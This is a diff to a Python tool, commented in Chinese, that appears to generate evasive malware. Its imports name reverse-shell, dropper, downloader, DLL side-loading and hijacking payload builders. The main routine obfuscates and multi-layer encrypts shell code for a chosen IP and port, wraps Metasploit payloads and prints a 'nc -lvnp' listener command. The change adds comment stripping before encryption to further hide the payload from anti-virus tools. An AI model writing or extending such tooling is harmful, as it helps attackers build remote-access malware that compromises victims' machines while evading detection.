@@ -17,7 +17,7 @@ import random
 
 # 导入模块
 from modules import (
-    AdvancedCipher, gene_advanced_key,
+    AdvancedCipher, gene_advanced_key, remove_comments_from_code,
     gene_code, gene_code_obfuscated, advanced_obfuscate_code,
     gene_shell, create_payload_dropper, create_downloader,
     create_white_black_payload, create_dll_sideloading_payload, create_hijacking_payload,
@@ -106,6 +106,9 @@ def main():
                         anti_detection=config['anti_detection'],
                         obfuscate=True
                     )
+                    
+                    # 清理MSF包装器代码中的注释
+                    msf_wrapper_code = remove_comments_from_code(msf_wrapper_code)
                     
                     # 可选加密MSF载荷
                     if config['anti_detection']:
@@ -228,17 +231,19 @@ def main():
                 print("❌ 下载器模式需要指定下载URL")
                 sys.exit(1)
                 
-            # 1. 生成主程序（正常的Shell）
+            # 生成主程序（正常的Shell）
             if config['use_dropper']:
                 raw_code = gene_code_obfuscated(config['ip'], config['port'], config['retry'], config['delay'])
             else:
                 raw_code = gene_code(config['ip'], config['port'], config['retry'], config['delay'])
                 
-            raw_code = advanced_obfuscate_code(raw_code)  # 高级代码混淆
+            raw_code = advanced_obfuscate_code(raw_code)
+            
+            # 清理代码中的注释，确保加密前代码干净
+            raw_code = remove_comments_from_code(raw_code)
             
             key = gene_advanced_key(config['key_length'])
             
-            # 加密
             cipher = AdvancedCipher(key)
             encrypted_code = cipher.multi_layer_encrypt(raw_code) if config['anti_detection'] else cipher.encrypt(raw_code)
             
@@ -281,17 +286,19 @@ def main():
                 print(f"   3. 监听命令: nc -lvnp {config['port']}")
             
         else:
-            # 标准模式 - 原有逻辑
+            # 标准模式
             if config['use_dropper']:
                 raw_code = gene_code_obfuscated(config['ip'], config['port'], config['retry'], config['delay'])
             else:
                 raw_code = gene_code(config['ip'], config['port'], config['retry'], config['delay'])
                 
-            raw_code = advanced_obfuscate_code(raw_code)  # 高级代码混淆
+            raw_code = advanced_obfuscate_code(raw_code)
+            
+            # 清理代码中的注释，确保加密前代码干净
+            raw_code = remove_comments_from_code(raw_code)
             
             key = gene_advanced_key(config['key_length'])
             
-            # 加密
             cipher = AdvancedCipher(key)
             encrypted_code = cipher.multi_layer_encrypt(raw_code) if config['anti_detection'] else cipher.encrypt(raw_code)
             
